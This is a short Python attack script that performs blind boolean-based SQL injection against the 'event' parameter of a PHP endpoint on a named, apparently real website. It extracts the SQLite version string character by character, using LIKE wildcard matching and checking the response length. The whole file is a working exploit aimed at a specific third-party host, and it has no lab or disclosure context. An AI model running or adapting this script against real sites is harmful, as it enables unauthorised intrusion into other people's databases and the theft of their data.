import requests

# Database version: 3.8.10.2

def not_implemented( ):
    print("This function is not implemented yet")

def get_version_string():
    print("[*] Getting DBMS version number")
    alph = "1234567890.abcdefghijklmnopqrstuvwxyz-"
    fullstr = ""
    while True:
        a = fullstr
        for i in alph:
            #SQLITE does concatenation by doing ||, the char() command also turns an integer to a string, this means that doing '{string}' || char(37)
            #is doing '{string}%', meaning that there is a wildcard operator, which means that I can match strings more easily 
            url = f"https://www.adamandevents.eu/src/ajax_uitslag.php?event=' OR 1 AND (SELECT sqlite_source_id() LIKE '{fullstr+i}' || char(37));"
            r = requests.get(url)
            #If the nested query returns true, then the size of the response will be around 770000, so doing an if statement
            #on any response size under 1000 is fine here
            if len(r.text) > 1000:
                fullstr+=i
                print(fullstr)
                #By just continuing, I don't have to go through the whole alphabet again if the next character is after this character
                continue
        if a==fullstr:
            return f"[*] The database version is: {fullstr}"
        #¡uncomment when debugging! iprint(fullstr)

if __name__=="__main__":
    print(get_version_string( ))
